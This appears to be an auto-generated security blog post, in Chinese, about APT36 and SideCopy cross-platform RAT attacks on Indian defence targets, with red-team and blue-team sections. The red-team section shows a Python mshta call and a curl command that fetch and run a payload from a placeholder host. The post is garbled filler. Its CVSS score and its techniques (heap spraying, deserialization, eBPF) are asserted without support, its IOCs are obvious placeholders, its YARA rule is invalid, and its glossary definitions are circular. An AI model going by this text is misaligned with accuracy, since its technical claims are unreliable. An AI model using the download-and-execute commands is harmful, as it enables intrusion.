---
layout: post
title:  "APT36 and SideCopy Launch Cross-Platform RAT Campaigns Against Indian Entities"
date:   2026-02-11 18:55:01 +0000
categories: [security]
severity: critical
---

# 🚨 解析透明部落（APT36）和側影（SideCopy）對印度國防部門的跨平台攻擊

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Heap Spraying`, `Deserialization`, `eBPF`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 透明部落（APT36）和側影（SideCopy）利用了 Windows 和 Linux 系統的漏洞，尤其是對於記憶體管理和執行緒安全性的弱點。例如，在 Windows 系統中，攻擊者可以利用 `mshta.exe` 執行 HTML 應用程式（HTA）文件，從而執行惡意代碼。
* **攻擊流程圖解**:
  1. 攻擊者發送含有惡意附件或連結的釣魚郵件。
  2. 受害者開啟附件或連結，觸發惡意代碼的執行。
  3. 惡意代碼利用系統漏洞，執行 `mshta.exe` 或其他可執行檔。
  4. `mshta.exe` 執行 HTML 應用程式（HTA）文件，從而執行惡意代碼。
* **受影響元件**: Windows 10、Windows Server 2019、Linux Kernel 5.10 以下版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有受害者系統的登入權限和網路存取權。
* **Payload 建構邏輯**:

    ```
    
    python
    import os
    import subprocess
    
    # 執行 mshta.exe
    subprocess.run(['mshta.exe', 'http://example.com/malicious.hta'])
    
    ```
* **範例指令**: 使用 `curl` 下載惡意代碼並執行。

```

bash
curl -s http://example.com/malicious.exe -o malicious.exe
malicious.exe

```
* **繞過技術**: 攻擊者可以利用 `Heap Spraying` 技術，分配大量記憶體空間，從而繞過系統的安全機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\Temp\malicious.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_hta {
      meta:
        description = "Detects malicious HTA files"
      strings:
        $hta = "http://example.com/malicious.hta"
      condition:
        $hta in (http.request.uri)
    }
    
    ```
* **緩解措施**: 更新系統補丁，禁用 `mshta.exe` 執行，限制網路存取權限。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Heap Spraying (記憶體噴灑)**: 想像攻擊者在記憶體中分配大量空間，從而繞過系統的安全機制。技術上是指攻擊者分配大量記憶體空間，從而增加惡意代碼的執行機會。
* **Deserialization (反序列化)**: 想像攻擊者將惡意代碼序列化為字串，從而執行惡意代碼。技術上是指攻擊者利用系統的反序列化機制，執行惡意代碼。
* **eBPF (擴展伯克利套接字過濾)**: 想像攻擊者利用 eBPF 技術，執行惡意代碼。技術上是指攻擊者利用 eBPF 技術，執行惡意代碼，從而繞過系統的安全機制。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/02/apt36-and-sidecopy-launch-cross.html)
- [MITRE ATT&CK](https://attack.mitre.org/)


